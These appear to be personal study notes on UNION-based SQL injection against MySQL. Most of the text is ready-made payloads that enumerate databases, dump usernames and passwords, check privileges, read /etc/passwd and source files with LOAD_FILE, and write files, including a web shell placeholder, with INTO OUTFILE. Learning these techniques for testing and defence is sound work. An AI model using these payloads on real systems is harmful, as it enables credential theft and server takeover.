#### Database Enumeration

Testing for MySQL:
![[Pasted image 20250205111327.png]]

To reference a  table in another DB, use '.'
```sql
SELECT * FROM my_database.users;
```


To find database names:
```shell-session
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```


```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

```sql
cn' UNION select 1,database(),2,3-- -
```

Print out records from another database:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Print out columns from a table:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```


#### Privileges - Reading

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Testing super admin privileges:
```sql
SELECT super_priv FROM mysql.user
```
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
Y = yes

Show privileges:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

If FILE is a privilege, we can read local system files:
```sql
SELECT LOAD_FILE('/etc/passwd');
```
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Source code:
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```


#### Privileges - Writing

3 things must be enables:
1. User with FILE privilege enabled
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
Empty = read/write files to any location

Writing files:
```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

```sql
cn' union select "",'<input php web shell here>', "", "" into outfile '/var/www/html/shell.php'-- -
```

